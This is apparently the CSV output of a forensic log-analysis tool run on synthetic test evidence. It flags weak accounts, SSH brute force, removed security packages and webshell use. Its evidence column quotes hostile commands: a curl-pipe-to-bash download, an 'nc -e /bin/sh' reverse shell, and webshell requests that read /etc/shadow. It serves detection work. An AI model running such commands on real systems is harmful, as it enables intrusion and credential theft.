severity,category,title,description,artifact,timestamp,evidence,metadata
CRITICAL,credential_access,Account with empty password: bob,Account 'bob' has an empty password hash and an interactive shell - login is possible without credentials.,/home/claude/test_evidence/etc/shadow,2026-04-27T10:54:37+00:00,bob::19500:0:99999:7:::,user=bob
CRITICAL,credential_access,Direct root SSH login from 198.51.100.99,Successful interactive root SSH login from 198.51.100.99 via publickey. Direct root logins should be disabled (PermitRootLogin no).,/home/claude/test_evidence/var/log/auth.log,2026-09-12T05:01:00+00:00,Sep 12 05:01:00 web01 sshd[22000]: Accepted publickey for root from 198.51.100.99 port 51000 ssh2: RSA SHA256:XXXXXX,user=root; ip=198.51.100.99; method=publickey
CRITICAL,privilege_escalation,Non-root account with UID 0: toor,Account 'toor' has UID 0 - it has full root privileges. Legitimate systems have exactly one UID 0 account named 'root'.,/home/claude/test_evidence/etc/passwd,2026-04-27T10:54:32+00:00,toor:x:0:0:root backup:/root:/bin/bash,user=toor; uid=0
HIGH,account_management,Service account 'backup' has interactive shell,The system account 'backup' is configured with an interactive shell (/bin/bash). System accounts should have /usr/sbin/nologin or /bin/false.,/home/claude/test_evidence/etc/passwd,2026-04-27T10:54:32+00:00,backup:x:34:34:backup:/var/backups:/bin/bash,user=backup; shell=/bin/bash
HIGH,account_management,Service account 'www-data' has interactive shell,The system account 'www-data' is configured with an interactive shell (/bin/bash). System accounts should have /usr/sbin/nologin or /bin/false.,/home/claude/test_evidence/etc/passwd,2026-04-27T10:54:32+00:00,www-data:x:33:33:www-data:/var/www:/bin/bash,user=www-data; shell=/bin/bash
HIGH,anomaly,Kernel anomaly: ANOM_PROMISCUOUS,"auditd recorded a kernel anomaly event (ANOM_PROMISCUOUS). These typically indicate crashes, abends, or promiscuous-mode interface changes.",/home/claude/test_evidence/var/log/audit/audit.log,2024-09-12T03:55:00+00:00,type=ANOM_PROMISCUOUS msg=audit(1726113300.000:400): dev=eth0 prom=256 old_prom=0 auid=0 uid=0 gid=0 ses=4,
HIGH,credential_access,SSH brute-force pattern from 192.0.2.55,26 failed SSH authentications observed from 192.0.2.55 targeting 21 username(s).,auth.log/secure,,"users: admin, backup, demo, deploy, developer, docker, ftp, git, guest, info","ip=192.0.2.55; count=26; users=['admin', 'backup', 'demo', 'deploy', 'developer', 'docker', 'ftp', 'git', 'guest', 'info', 'mail', 'mysql', 'nginx', 'oracle', 'pi', 'postgres', 'root', 'test', 'testing', 'user', 'www']"
HIGH,credential_access,Successful SSH login after 26 failures from 192.0.2.55,User alice authenticated successfully from 192.0.2.55 after 26 failed attempts in the prior 10 minutes.,auth.log/secure,2026-09-12T04:23:30+00:00,,ip=192.0.2.55; user=alice
HIGH,defense_evasion,SELinux denial: sshd,SELinux blocked process sshd (scontext=system_u:system_r:sshd_t:s0-s0:c0.c1023) accessing target context unconfined_u:object_r:user_home_t:s0.,/home/claude/test_evidence/var/log/audit/audit.log,2024-09-12T03:53:20.111000+00:00,"type=AVC msg=audit(1726113200.111:300): avc:  denied  { execute } for  pid=2222 comm=""sshd"" name=""badbin"" dev=""dm-0"" ino=12345 scontext=system_u:system_r:sshd_t:s0-s0:c0.c1023 tcontext=unconfined_u:object_r:user_home_t:s0 tclass=file",
HIGH,defense_evasion,Security package removed: auditd,A security / monitoring package (auditd) was uninstalled. Confirm whether this matches an authorised change.,/home/claude/test_evidence/var/log/dpkg.log,2025-09-12T04:30:21+00:00,,package=auditd; action=remove
HIGH,defense_evasion,Security package removed: auditd,A security / monitoring package (auditd) was uninstalled. Confirm whether this matches an authorised change.,/home/claude/test_evidence/var/log/apt/history.log,2025-09-12T04:30:20+00:00,,package=auditd; action=remove
HIGH,defense_evasion,Security package removed: fail2ban,A security / monitoring package (fail2ban) was uninstalled. Confirm whether this matches an authorised change.,/home/claude/test_evidence/var/log/dpkg.log,2025-09-12T04:30:30+00:00,,package=fail2ban; action=remove
HIGH,defense_evasion,Security package removed: fail2ban,A security / monitoring package (fail2ban) was uninstalled. Confirm whether this matches an authorised change.,/home/claude/test_evidence/var/log/apt/history.log,2025-09-12T04:30:20+00:00,,package=fail2ban; action=remove
HIGH,execution,Possible webshell access,HTTP request from 198.51.100.99 contains tokens commonly associated with webshell command execution: 'cmd='.,/home/claude/test_evidence/var/log/apache2/access.log,2025-09-12T04:30:11+00:00,"198.51.100.99 - - [12/Sep/2025:04:30:11 +0000] ""GET /uploads/wso.php?cmd=id HTTP/1.1"" 200 543 ""-"" ""Mozilla/5.0""",ip=198.51.100.99; request=GET /uploads/wso.php?cmd=id HTTP/1.1
HIGH,execution,Possible webshell access,HTTP request from 198.51.100.99 contains tokens commonly associated with webshell command execution: 'cmd='.,/home/claude/test_evidence/var/log/apache2/access.log,2025-09-12T04:30:15+00:00,"198.51.100.99 - - [12/Sep/2025:04:30:15 +0000] ""GET /uploads/wso.php?cmd=whoami HTTP/1.1"" 200 19 ""-"" ""Mozilla/5.0""",ip=198.51.100.99; request=GET /uploads/wso.php?cmd=whoami HTTP/1.1
HIGH,execution,Possible webshell access,HTTP request from 198.51.100.99 contains tokens commonly associated with webshell command execution: 'cmd='.,/home/claude/test_evidence/var/log/apache2/access.log,2025-09-12T04:30:30+00:00,"198.51.100.99 - - [12/Sep/2025:04:30:30 +0000] ""GET /uploads/wso.php?cmd=cat+/etc/shadow HTTP/1.1"" 200 1029 ""-"" ""Mozilla/5.0""",ip=198.51.100.99; request=GET /uploads/wso.php?cmd=cat+/etc/shadow HTTP/1.1
HIGH,execution,Suspicious EXECVE in auditd,"auditd recorded an EXECVE containing tokens associated with attacker tradecraft: curl , | bash.",/home/claude/test_evidence/var/log/audit/audit.log,2024-09-12T03:51:00.456000+00:00,/bin/bash -c curl -s http://198.51.100.7/x.sh | bash,
HIGH,execution,Suspicious EXECVE in auditd,auditd recorded an EXECVE containing tokens associated with attacker tradecraft: nc -e.,/home/claude/test_evidence/var/log/audit/audit.log,2024-09-12T03:52:00.789000+00:00,nc -e /bin/sh 198.51.100.7,
HIGH,hardening,PermitRootLogin = yes,sshd is configured to allow root login. Industry best practice is 'no'. 'without-password' permits root via key.,/home/claude/test_evidence/etc/ssh/sshd_config,2026-04-27T10:55:06+00:00,PermitRootLogin yes,
HIGH,hardening,Root password SSH login enabled,Both PermitRootLogin and PasswordAuthentication permit interactive root password authentication.,/home/claude/test_evidence/etc/ssh/sshd_config,2026-04-27T10:55:06+00:00,,
HIGH,hardware_anomaly,USB mass-storage attach,USB mass-storage device was attached. On servers this is anomalous and may indicate physical tampering or data exfiltration.,/home/claude/test_evidence/var/log/messages,2026-09-12T03:14:02+00:00,Sep 12 03:14:02 web01 kernel: usb-storage 1-1:1.0: USB Mass Storage device detected,
HIGH,hardware_anomaly,USB mass-storage attach,USB mass-storage device was attached. On servers this is anomalous and may indicate physical tampering or data exfiltration.,/home/claude/test_evidence/var/log/kern.log,2026-09-12T03:14:02+00:00,Sep 12 03:14:02 web01 kernel: [    1.345678] usb-storage 1-1:1.0: USB Mass Storage device detected,
HIGH,mac_denial,AppArmor denial in syslog,AppArmor denied an action - review the offending profile and the process being confined.,/home/claude/test_evidence/var/log/messages,2026-09-12T05:01:00+00:00,"Sep 12 05:01:00 web01 kernel: audit: type=1400 audit(1726113660.123:201): apparmor=""DENIED"" operation=""open"" profile=""/usr/sbin/nginx""",
